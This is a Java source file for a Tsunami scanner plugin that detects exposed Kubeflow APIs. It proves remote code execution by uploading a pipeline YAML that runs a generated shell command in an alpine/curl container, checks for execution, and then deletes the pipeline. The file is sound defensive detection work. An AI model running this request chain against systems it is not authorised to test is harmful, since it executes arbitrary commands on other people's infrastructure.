/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.delete;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.Optional;
import javax.inject.Inject;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okio.Buffer;

/** A {@link VulnDetector} that detects publicly exposed kubeflow instances. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Exposed Kubeflow API Detector",
    version = "0.1",
    description =
        "this vulnerability check exposed Kubeflow API by executing a OS command in a kubeflow"
            + " pipeline.",
    author = "grandsilva",
    bootstrapModule = KubeflowRceDetectorBootstrapModule.class)
public final class KubeflowRceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final int oobSleepDuration;

  private final PayloadGenerator payloadGenerator;

  @VisibleForTesting
  static final String PAYLOAD =
      "components:\n"
          + "  comp-hello-world-container:\n"
          + "    executorLabel: exec-hello-world-container\n"
          + "deploymentSpec:\n"
          + "  executors:\n"
          + "    exec-hello-world-container:\n"
          + "      container:\n"
          + "        command:\n"
          + "          - sh\n"
          + "          - -c\n"
          + "          - '%s'\n"
          + "        image: alpine/curl:8.12.1\n"
          + "pipelineInfo:\n"
          + "  name: v2-container-component-no-input\n"
          + "root:\n"
          + "  dag:\n"
          + "    tasks:\n"
          + "      hello-world-container:\n"
          + "        cachingOptions:\n"
          + "          enableCache: true\n"
          + "        componentRef:\n"
          + "          name: comp-hello-world-container\n"
          + "        taskInfo:\n"
          + "          name: hello-world-container\n"
          + "schemaVersion: 2.1.0\n"
          + "sdkVersion: kfp-2.0.0-beta.0";

  @Inject
  KubeflowRceDetector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {

    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("KubeflowRceDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isKubeflowWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isKubeflowWebService(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    try {
      Optional<String> response =
          httpClient.send(get(rootUrl).withEmptyHeaders().build(), networkService).bodyString();
      return response.isPresent()
          && response.get().contains("<title>Kubeflow Central Dashboard</title>");
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return false;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    HttpResponse response;
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();
    String pipelineId = "";
    String pipelineVersionId = "";
    String tsunamiExperimentId;
    List<String> nameSpaces;
    try {
      // get all namespaces
      response =
          httpClient.send(
              get(rootUrl + "api/workgroup/env-info")
                  .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                  .build(),
              networkService);
      if (response == null || response.bodyString().isEmpty()) {
        return false;
      }
      nameSpaces = getNamespaces(response.bodyString().get());
      if (nameSpaces.isEmpty()) {
        return false;
      }
      // test all nameSpaces one by one, stop if the payload is executed once
      for (String nameSpace : nameSpaces) {
        logger.atInfo().log("Sending Request to Namespace: %s", nameSpace);

        // create an experiment
        response =
            httpClient.send(
                post(rootUrl + "pipeline/apis/v2beta1/experiments")
                    .setHeaders(
                        HttpHeaders.builder().addHeader("Content-Type", "application/json").build())
                    .setRequestBody(
                        ByteString.copyFromUtf8(
                            String.format(
                                "{\"description\":\"\",\"display_name\":"
                                    + "\"TsunamiExperiment\",\"namespace\":\"%s\"}",
                                nameSpace)))
                    .build(),
                networkService);
        if (response == null || response.bodyString().isEmpty()) {
          return false;
        }

        if (response.bodyString().get().contains("The name TsunamiExperiment already exists.")) {
          // get an existing Experiment ID that we
          // created previously with the name 'TsunamiExperiment'
          response =
              httpClient.send(
                  get(rootUrl
                          + "pipeline/apis/v2beta1/experiments?page_token="
                          + "&page_size=100&sort_by=created_at%20desc&filter="
                          + "%257B%2522predicates%2522%253A%255B%257B%2522key"
                          + "%2522%253A%2522storage_state%2522%252C%2522"
                          + "operation%2522%253A%2522NOT_EQUALS%2522%252C%2522"
                          + "string_value%2522%253A%2522ARCHIVED%2522%257D%255D%257D&namespace="
                          + nameSpace)
                      .setHeaders(
                          HttpHeaders.builder().addHeader("Accept", "application/json").build())
                      .build(),
                  networkService);
          if (response == null || response.bodyString().isEmpty()) {
            return false;
          }
          tsunamiExperimentId = getExistingExperimentId(response.bodyString().get());
        } else {
          tsunamiExperimentId = getExperimentId(response.bodyString().get());
        }
        if (tsunamiExperimentId.isEmpty()) {
          return false;
        }

        // create a pipeline
        MultipartBody mBody =
            new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "uploadfile",
                    "examplePipeline.yaml",
                    RequestBody.create(
                        MediaType.parse("application/yaml"), String.format(PAYLOAD, cmd)))
                .build();
        Buffer sink = new Buffer();
        mBody.writeTo(sink);

        response =
            httpClient.send(
                post(rootUrl
                        + String.format(
                            "pipeline/apis/v2beta1/pipelines/upload?name=%s&description=&namespace=%s",
                            "TsunamiPipeline-" + generateRandomAlphanumeric(), nameSpace))
                    .setHeaders(
                        HttpHeaders.builder()
                            .addHeader(
                                "Content-Type",
                                Objects.requireNonNull(mBody.contentType()).toString())
                            .build())
                    .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
                    .build(),
                networkService);
        if (response == null || response.bodyString().isEmpty()) {
          return false;
        }
        pipelineId = getPipelineId(response.bodyString().get());
        if (pipelineId.isEmpty()) {
          return false;
        }

        // get pipeline version id
        response =
            httpClient.send(
                get(rootUrl
                        + String.format(
                            "pipeline/apis/v2beta1/pipelines/%s/versions"
                                + "?page_size=1&sort_by=created_at%%20desc",
                            pipelineId))
                    .withEmptyHeaders()
                    .build(),
                networkService);
        if (response == null || response.bodyString().isEmpty()) {
          return false;
        }
        pipelineVersionId = getFirstPipelineVersionId(response.bodyString().get());
        if (pipelineVersionId.isEmpty()) {
          return false;
        }

        // Create a RUN
        response =
            httpClient.send(
                post(rootUrl + "pipeline/apis/v2beta1/runs")
                    .setHeaders(
                        HttpHeaders.builder().addHeader("Content-Type", "application/json").build())
                    .setRequestBody(
                        ByteString.copyFromUtf8(
                            String.format(
                                "{\"description\":\"\",\"display_name\":\"Run of TsunamiPipeline2"
                                    + " (f510b)\",\"experiment_id\":\"%s\","
                                    + "\"pipeline_version_reference\":{\"pipeline_id\":\"%s\","
                                    + "\"pipeline_version_id\":\"%s\"},\"runtime_config\""
                                    + ":{\"parameters\":{}},\"service_account\":\"\"}",
                                tsunamiExperimentId, pipelineId, pipelineVersionId)))
                    .build(),
                networkService);
        if (response == null || response.bodyString().isEmpty()) {
          deletePipeline(pipelineId, pipelineVersionId, networkService);
          return false;
        }
        if (payload.getPayloadAttributes().getUsesCallbackServer()) {
          logger.atInfo().log("Waiting for RCE callback.");
          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
        }
        deletePipeline(pipelineId, pipelineVersionId, networkService);
        if (payload.checkIfExecuted(response.bodyString().get())) {
          return true;
        }
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      deletePipeline(pipelineId, pipelineVersionId, networkService);
      return false;
    }
    deletePipeline(pipelineId, pipelineVersionId, networkService);
    return false;
  }

  private void deletePipeline(
      String pipelineId, String pipelineVersionId, NetworkService networkService) {
    if (pipelineId.isEmpty() || pipelineVersionId.isEmpty()) {
      return;
    }
    try {
      httpClient.send(
          delete(
                  NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
                      + String.format(
                          "pipeline/apis/v2beta1/pipelines/%s" + "/versions/%s",
                          pipelineId, pipelineVersionId))
              .withEmptyHeaders()
              .build(),
          networkService);
      httpClient.send(
          delete(
                  NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
                      + String.format("pipeline/apis/v2beta1/pipelines/%s", pipelineId))
              .withEmptyHeaders()
              .build(),
          networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to delete pipeline.");
    }
  }

  private List<String> getNamespaces(String jsonResponse) {
    List<String> namespaces = new ArrayList<>();
    try {
      JsonObject jsonObject = JsonParser.parseString(jsonResponse).getAsJsonObject();
      JsonArray namespacesArray = jsonObject.getAsJsonArray("namespaces");

      for (JsonElement element : namespacesArray) {
        JsonObject namespaceObject = element.getAsJsonObject();
        namespaces.add(namespaceObject.get("namespace").getAsString());
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to parse namespaces from response.");
      return Collections.emptyList();
    }
    return namespaces;
  }

  private String getExperimentId(String response) {
    try {
      JsonObject jsonObject = JsonParser.parseString(response).getAsJsonObject();
      return jsonObject.get("experiment_id").getAsString();
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to parse experiment ID from response.");
      return "";
    }
  }

  private String getExistingExperimentId(String response) {
    try {
      JsonObject jsonObject = JsonParser.parseString(response).getAsJsonObject();
      JsonArray experiments = jsonObject.getAsJsonArray("experiments");
      for (JsonElement element : experiments) {
        JsonObject experiment = element.getAsJsonObject();
        if ("TsunamiExperiment".equals(experiment.get("display_name").getAsString())) {
          return experiment.get("experiment_id").getAsString();
        }
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to parse experiment ID from response.");
    }
    return "";
  }

  private static String getPipelineId(String response) {
    try {
      JsonObject jsonObject = JsonParser.parseString(response).getAsJsonObject();
      return jsonObject.get("pipeline_id").getAsString();
    } catch (Exception e) {
      System.out.println("Failed to parse pipeline ID from response.");
      System.out.println(response);
      return "";
    }
  }

  private static String getFirstPipelineVersionId(String response) {
    try {
      JsonObject jsonObject = JsonParser.parseString(response).getAsJsonObject();
      JsonArray pipelineVersions = jsonObject.getAsJsonArray("pipeline_versions");
      if (pipelineVersions.size() > 0) {
        JsonObject firstPipelineVersion = pipelineVersions.get(0).getAsJsonObject();
        return firstPipelineVersion.get("pipeline_version_id").getAsString();
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to parse pipeline version ID from response.");
    }
    return "";
  }

  private static String generateRandomAlphanumeric() {
    String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    StringBuilder result = new StringBuilder();
    java.util.Random random = new java.util.Random();
    for (int i = 0; i < 10; i++) {
      result.append(characters.charAt(random.nextInt(characters.length())));
    }
    return result.toString();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("KUBEFLOW_EXPOSED_API_RCE"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("Exposed kubeflow API")
            .setDescription(
                "This vulnerability check exposed Kubeflow API by executing a OS command in a"
                    + " kubeflow pipeline.")
            .build());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
